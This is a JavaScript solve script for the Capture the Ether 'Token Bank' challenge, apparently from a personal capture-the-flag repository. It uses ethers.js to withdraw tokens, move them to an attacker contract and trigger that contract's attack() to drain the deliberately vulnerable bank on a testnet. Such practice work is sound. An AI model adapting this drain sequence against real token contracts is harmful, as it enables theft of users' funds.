/*
 * @Author: Soingjeang
 * @Date: 2022-07-21 14:49:07
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-08-03 18:59:45
 * @FilePath: \CapTheEther\src\miscellaneous\5_2_TokenBankChallenge.js
 */
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/TokenBankChallenge.json'; // fill
const ctfAbi = './build/contracts/CTFTokenBankChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0x16c5F8d549B9a3f00E202A6A97AA985c7595bA57" // fill
const contractChallangeAddress = "0xDEe98AE551DfE3b516b25e7eB6f2D659E1F781F4" // fill
const localChallange = "0x55c43dD80035F335B5114F1D4439add7a8E0F82b" //fill
const localctf = "0xD1700691909e4d96250C1f4bf7e7A4d012Cf3230" //fill

var localtest = 0  //fill

let provider = utils.getNetProvider("3", localtest)


async function guess(contractCtf, contractChallenge, wallet) {
    var decimals = ethers.BigNumber.from(10)
    decimals = decimals.pow(18)
    var amount = decimals.mul(500000)
    var tokenAddress = await provider.getStorageAt(contractChallenge.address, 0)
    if (!localtest) {
        tokenAddress = '0x' + tokenAddress.slice(26)
    }
    const SimpleERC223TokenAbi = './build/contracts/SimpleERC223Token.json'
    let contrateToken = utils.getContract(wallet, SimpleERC223TokenAbi, tokenAddress, provider)

    trans = 1
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    if (!comp) {
        if ( trans == 0 ) {
            balan = await contrateToken.getbalance(contractChallenge.address)
            console.log("balance: " + balan)
            appr = await contrateToken.getApprove(wallet.address)
            console.log("appr: " + appr)
        }
        else if ( trans == 1 ) {
            // 提取自己的money
            await contractChallenge.withdraw(amount)
            console.log("get money to myself success   token: " + tokenAddress)
        }
        else if ( trans == 2 ){
            // 转到CTF合约
            // await contrateToken.transfer(ctfaddress, amount)
            await contrateToken.approve(wallet.address, amount)
            console.log("approve money to myself")
            if (localtest) {
                await contrateToken.transferFrom(wallet.address, localctf, amount)
            } else {
                await contrateToken.transferFrom(wallet.address, ctfaddress, amount)
            }
            console.log("transferFrom: " + wallet.address + " to ctf success")
        }
        else if ( trans == 3 ){
            // // 存入challenge
            await contractCtf.setAmount(amount)
            console.log("set amount: ")
            await contractCtf.setTokens(tokenAddress, contractChallenge.address, amount)
            console.log("store money from contract to challenge success")
        }
        else {
            // ctf 发起 取款 攻击
            await contractCtf.attack(contractChallenge.address, amount, amount.mul(2), {gasLimit:1000000})
        }
    }
    
    console.log("uess me success")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile, localtest)

    var contractChall
    var contrateCtf
    if (localtest) {
        contractChall = utils.getContract(wallet, abiFile, localChallange, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, localctf, provider)
    }
    else {
        contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    }
    
    guess(contrateCtf, contractChall, wallet)
}

doCapture()

